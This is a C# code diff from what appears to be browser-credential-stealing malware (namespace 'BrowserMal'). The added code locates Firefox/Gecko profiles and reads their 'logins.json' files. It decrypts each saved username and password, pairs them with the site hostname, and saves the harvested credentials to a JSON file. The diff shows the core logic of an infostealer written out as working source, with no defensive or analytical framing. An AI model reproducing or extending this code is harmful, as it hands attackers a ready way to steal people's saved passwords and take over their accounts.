@@ -30,22 +30,46 @@ namespace BrowserMal.Manager
                     continue;
 
                 List<string> profiles = GetAllProfiles(browser.Location);
-                FetchFiles(profiles);
+                List<CredentialModel> creds = FetchFiles(profiles, browser.Name);
+
+                Filesaver.FileManager.Save<CredentialModel>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_logins.json");
             }
 
         }
-
-        private void FetchFiles(List<string> profiles)
+        Encryption.GeckoDecryption geckoDecryption;
+        private List<CredentialModel> FetchFiles(List<string> profiles, string name)
         {
+            List<CredentialModel> result = new List<CredentialModel>();
+
             foreach (string profile in profiles)
             {
-                if (File.Exists(Path.Combine(profile, "logins.json")))
+                string loginFile = Path.Combine(profile, "logins.json");
+
+                if (File.Exists(loginFile))
                 {
-                    Encryption.GeckoDecryption.Init(profile);
+                    if (profile.Contains("dev"))
+                    {
+                        geckoDecryption = new Encryption.GeckoDecryption();
+                        geckoDecryption.Init(profile, name);
+                        break;
+                    }
+                }
+            }
+
+            foreach (string profile in profiles)
+            {
+                string loginFile = Path.Combine(profile, "logins.json");
+
+                if (File.Exists(loginFile))
+                {
+                    if (!loginFile.Contains("dev"))
+                        continue;
+                    /*geckoDecryption = new Encryption.GeckoDecryption();
+                    geckoDecryption.Init(profile, name);*/
 
                     GeckoLogin geckoLogin;
 
-                    using (StreamReader sr = new StreamReader(Path.Combine(profile, "logins.json")))
+                    using (StreamReader sr = new StreamReader(loginFile))
                     {
                         string json = sr.ReadToEnd();
                         geckoLogin = JsonConvert.DeserializeObject<GeckoLogin>(json);
@@ -53,11 +77,20 @@ namespace BrowserMal.Manager
 
                     foreach (GeckoLoginData login in geckoLogin.logins) 
                     {
-                        string username = Encryption.GeckoDecryption.Decrypt(login.encryptedUsername);
-                        string password = Encryption.GeckoDecryption.Decrypt(login.encryptedPassword);
+                        string username = geckoDecryption.Decrypt(login.encryptedUsername);
+                        string password = geckoDecryption.Decrypt(login.encryptedPassword);
+                        string hostname = login.hostname;
+
+                        result.Add(new CredentialModel(hostname, username, password));
                     }
+
+                    //geckoDecryption.Unload();
+
+                    break;
                 }
             }
+
+            return result;
         }
     }
 }
